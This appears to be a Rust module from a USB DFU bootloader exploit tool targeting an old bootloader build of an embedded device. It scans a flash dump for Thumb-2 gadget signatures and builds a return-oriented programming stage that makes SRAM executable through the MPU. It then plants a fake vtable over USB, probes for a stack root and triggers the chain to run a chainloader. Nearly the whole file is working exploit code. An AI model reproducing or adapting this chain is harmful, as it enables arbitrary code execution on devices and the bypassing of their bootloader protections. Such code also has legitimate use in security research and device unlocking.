//! Old bootloader build (v20_24 / boot_old) architectural implementation:
//! - 0x824 offset for the stock byte setter (MPU_RNR target)
//! - WORD_STORE primitive (`str r2, [r0]; bx lr`)
//! - 5-register push and 0x1C SP-decrement stack frames in stock callbacks
//! - Adjacent [stock_callback, stock_setter] needle in the USB DFU vtable
//!
//! Gadget addresses and vtable offsets are dynamically identified at runtime
//! using Thumb-2 byte signature scanning against the internal flash dump.

use anyhow::{Result, bail};
use rusb::{DeviceHandle, GlobalContext};

pub use super::base::*;
use crate::dfu::read_memory;
use crate::sigscan::{FLASH_BASE, Symbols, resolve_symbols};

pub fn stock_vtable(
    callback: Option<u32>,
    flash_data: &[u8],
    symbols: &Symbols,
) -> Result<Vec<u8>> {
    build_stock_vtable(flash_data, symbols.stock_callback, symbols.stock_setter, callback)
}

pub fn build_stage(fake_vtable: u32, symbols: &Symbols) -> Vec<u8> {
    let mut stage = vec![0u8; 0x200];
    let pivot_table = STAGE + 0x1E0;

    // Write the marker, then restore the modified callback before booting.
    put(&mut stage, 0x00, MARKER);
    put(&mut stage, 0x04, STAGE + 0x1C0);
    put(&mut stage, 0x08, 4);
    put(&mut stage, 0x18, symbols.pop_r3_pc);
    put(&mut stage, 0x1C, symbols.memmove);
    put(&mut stage, 0x20, symbols.bx_r3);
    put(&mut stage, 0x30, symbols.pop_r0_r1_r2_r4_r6_r7_pc);
    put(&mut stage, 0x34, fake_vtable + 8);
    put(&mut stage, 0x38, STAGE + 0x1C4);
    put(&mut stage, 0x3C, 4);
    put(&mut stage, 0x4C, symbols.pop_r3_pc);
    put(&mut stage, 0x50, symbols.memmove);
    put(&mut stage, 0x54, symbols.bx_r3);
    put(&mut stage, 0x64, symbols.pop_r0_r1_r2_r4_r6_r7_pc);

    // Make SRAM executable, then transfer to the XIP chainloader in SRAM.
    put(&mut stage, 0x68, MPU_RNR.wrapping_sub(0x824));
    put(&mut stage, 0x6C, 2);
    put(&mut stage, 0x80, symbols.pop_r3_pc);
    put(&mut stage, 0x84, symbols.stock_setter);
    put(&mut stage, 0x88, symbols.bx_r3);
    put(&mut stage, 0x98, symbols.pop_r0_r1_r2_r4_r6_r7_pc);
    put(&mut stage, 0x9C, MPU_RASR);
    put(&mut stage, 0xA4, MPU_RASR_VALUE);
    put(&mut stage, 0xB4, symbols.pop_r3_pc);
    put(&mut stage, 0xB8, symbols.word_store);
    put(&mut stage, 0xBC, symbols.bx_r3);
    put(&mut stage, 0xC4, pivot_table);
    put(&mut stage, 0xCC, symbols.pop_r3_pc);
    put(&mut stage, 0xD0, symbols.pivot);
    put(&mut stage, 0xD4, symbols.bx_r3);
    put(&mut stage, 0xDC, pivot_table);
    put(&mut stage, 0x1C0, MARKER_VALUE);
    put(&mut stage, 0x1C4, symbols.stock_callback);
    put(&mut stage, 0x1E0, SRAM_STACK);
    put(&mut stage, 0x1E4, SRAM_CODE | 1);
    stage
}

pub fn probe(flash_data: &[u8]) -> Result<Symbols> {
    let symbols = resolve_symbols(flash_data, FLASH_BASE)?;
    let _ = stock_vtable(None, flash_data, &symbols)?;
    let stage = build_stage(FAKE_VTABLE, &symbols);
    if word(&stage, 0x84) != symbols.stock_setter {
        bail!("Stage validation failed at 0x84");
    }
    if word(&stage, 0xB8) != symbols.word_store {
        bail!("Stage validation failed at 0xB8");
    }
    if word(&stage, 0x1E4) != (SRAM_CODE | 1) {
        bail!("Stage validation failed at 0x1E4");
    }
    Ok(symbols)
}

pub fn self_check(flash_data: &[u8]) -> Result<()> {
    let chainloader = get_chainloader();
    validate_chainloader(&chainloader)?;

    println!("Self-check [boot_old codebase]: resolving symbols and validating stage layout...");
    let symbols = probe(flash_data)?;
    symbols.for_each(|name, addr| {
        println!("  {name:25} -> 0x{addr:08x}");
    });

    println!("SELF_CHECK_OK");
    Ok(())
}

pub fn boot(
    handle: &DeviceHandle<GlobalContext>,
    flash_data: &[u8],
    save_dump: bool,
) -> Result<()> {
    let chainloader = get_chainloader();
    validate_chainloader(&chainloader)?;

    println!("Resolving symbols dynamically for boot_old codebase:");
    let symbols = resolve_symbols(flash_data, FLASH_BASE)?;
    symbols.for_each(|name, addr| {
        println!("  {name:25} -> 0x{addr:08x}");
    });

    if save_dump {
        save_flash_dump(flash_data)?;
    }

    reset_and_idle(handle)?;

    let before = read_memory(handle, BASE, RAM_SIZE)?;
    let probe_table = stock_vtable(None, flash_data, &symbols)?;
    write_fake_vtable(handle, &probe_table)?;

    let mut probe = vec![0u8; 0x93C];
    put(&mut probe, 0x938, FAKE_VTABLE);
    send_probe(handle, &probe)?;

    let after = read_memory(handle, BASE, RAM_SIZE)?;
    let root = find_fresh_root(&fake_hits(&before, &after))?;
    println!("fresh_root=0x{:08x} callback_sp=0x{:08x}", root, root.wrapping_sub(0x9BC));

    let dynamic_vtable = root.wrapping_sub(0x138);
    let stage = build_stage(dynamic_vtable, &symbols);
    write_stage_payloads(handle, MARKER, &stage, &chainloader)?;

    let mut payload = vec![0u8; 0x93C];
    put(&mut payload, 8, STAGE);
    put(&mut payload, 12, symbols.pop_r0_r1_r2_r4_r6_r7_pc);
    let mut table = stock_vtable(Some(symbols.initial_callback), flash_data, &symbols)?;
    put(&mut table, 16, symbols.nested_pivot);
    payload[0x800..0x800 + table.len()].copy_from_slice(&table);
    put(&mut payload, 0x938, dynamic_vtable);

    trigger_rop(handle, &payload)?;
    Ok(())
}
